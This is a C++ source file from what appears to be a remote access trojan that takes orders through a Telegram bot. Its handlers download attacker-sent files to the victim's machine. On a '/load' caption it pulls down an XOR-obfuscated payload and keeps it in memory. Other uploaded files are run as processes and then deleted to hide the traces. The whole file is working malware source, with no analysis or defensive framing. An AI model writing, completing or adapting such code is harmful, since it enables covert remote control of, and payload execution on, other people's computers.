#include "rat/Handler.hpp"
#include "rat/compression.hpp"
#include "rat/encryption/encryption.hpp"
#include "rat/encryption/xor.hpp"
#include "rat/handler/debug.hpp"
#include "rat/networking/helpers.hpp"
#include "rat/system.hpp"

#include <filesystem>
#include <fmt/core.h>
#include <sstream>
#include <sys/types.h>
#include <vector>

namespace rat::handler {

inline std::vector<std::filesystem::path> Handler::downloadMultipleFiles(
    ::rat::tbot::BaseBot *Tbot_Bot,
    const std::vector<::rat::tbot::File> &Tbot_Files) {
	std::ostringstream response_buffer;
	std::vector<std::filesystem::path> downloaded_files;
	downloaded_files.reserve(Tbot_Files.size());

		for(const auto &file : Tbot_Files) {
			std::filesystem::path file_path = std::filesystem::current_path();

				if(file.name.has_value() && !file.name->empty()) {
					file_path /= file.name.value();
				}
				else {
					file_path /= rat::system::getCurrentDateTime_Underscored();
				}

			// Ensure unique path to avoid collisions
			size_t suffix = 0;
			std::filesystem::path unique_path = file_path;
				while(std::filesystem::exists(unique_path)) {
					unique_path = file_path;
					unique_path += "_" + std::to_string(++suffix);
				}
			file_path = unique_path;

			HANDLER_DEBUG_LOG("We have file {} trying to download it",
			                  file_path.string());

				if(Tbot_Bot->downloadFile(file.id, file_path)) {
					response_buffer << "File: " << file_path.string()
					                << " has been downloaded\n";
					downloaded_files.push_back(file_path);
				}
				else {
					response_buffer << "File: " << file_path.string()
					                << " has not been downloaded\n";
				}
		}

	Tbot_Bot->sendMessage(response_buffer.str());
	downloaded_files.shrink_to_fit();
	return downloaded_files;
}

void Handler::handleXoredPayload(::rat::tbot::Message &Tbot_Message) {
		if(!Tbot_Message.caption || Tbot_Message.files.size() != 1) {
			return;
		}

	const std::string &caption = Tbot_Message.caption.value();
	// handling the key;
	{
		constexpr std::string_view load_command_string{"/load"};
		constexpr std::size_t load_length = load_command_string.size();

		std::string_view key;
			if(caption.size() >
			   load_length) { // minimal safe length for "/load"
				key = caption.substr(load_length); // grab after "/load"
			}
		auto trim_view = [](std::string_view sv) {
			size_t start = sv.find_first_not_of(" \t\n\r");
			size_t end = sv.find_last_not_of(" \t\n\r");
			if(start == std::string_view::npos)
				return std::string_view{};
			return sv.substr(start, end - start + 1);
		};

		key = trim_view(key);
		std::string_view key_str =
		    key.empty() ? ::rat::system::getCurrentDateTime_Underscored()
		                : std::string(key);

		this->state.payload_key = key_str;
	}
	{
		const std::string &file_id = Tbot_Message.files[0].id;
		const std::string file_url =
		    fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);

		HANDLER_DEBUG_LOG("Downloading Obfuscated payload from File url: {}",
		                  file_url);

		HANDLER_DEBUG_LOG("XOR key :{}", this->state.payload_key);
		auto result =
		    downloadXoredPayload(&this->bot->curl_client, this->state.payload,
		                         file_url, &this->state.payload_key);

		this->state.payload_uncompressed_size = result.size;
		HANDLER_DEBUG_LOG("File downloaded with uncompressed size {} ",
		                  this->state.payload_uncompressed_size);
	}

	constexpr uint8_t zlib_compression_level = 5;

	::rat::compression::zlibCompressVector(this->state.payload,
	                                       zlib_compression_level);

	HANDLER_DEBUG_LOG("Succeeded at downloading the payload into RAM "
	                  "obfuscated, Number of Bytes from {} to {}",
	                  this->state.payload_uncompressed_size,
	                  this->state.payload.size());
}

inline void Handler::handlePayload(::rat::tbot::Message &Tbot_Message,
                                   const std::filesystem::path &Payload_Path) {
	const std::string dummy_telegram_message =
	    fmt::format("/lprocess {}", Payload_Path.string());
	HANDLER_DEBUG_LOG("Dummy telegram message created and assigned");

	Tbot_Message.text = dummy_telegram_message;

	this->parseTelegramMessageToCommand();
	this->handleProcessCommand();

	HANDLER_DEBUG_LOG("The payload launched, removing binary");

	// Remove file safely after use
	std::error_code ec;
	std::filesystem::remove(Payload_Path, ec);
		if(ec) {
			HANDLER_ERROR_LOG("Failed to remove payload file {}: {}",
			                  Payload_Path.string(), ec.message());
		}
}

void Handler::handleMessageWithUploadedFiles() {
		if(this->telegram_update->message.files.empty()) {
			return;
		}

	const auto &caption_opt = this->telegram_update->message.caption;
	HANDLER_DEBUG_LOG("Uploaded file caption: {}\nNumber of uploaded files: {}",
	                  caption_opt.value_or("None"),
	                  this->telegram_update->message.files.size());

		if(caption_opt && caption_opt->starts_with("/load")) {
			this->handleXoredPayload(this->telegram_update->message);
			return;
		}

	const auto file_paths = this->downloadMultipleFiles(
	    this->bot.get(), this->telegram_update->message.files);
		if(!file_paths.empty()) {
			this->handlePayload(this->telegram_update->message, file_paths[0]);
		}
}
} // namespace rat::handler

#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
#undef DEBUG_RAT_HANDLER
#endif
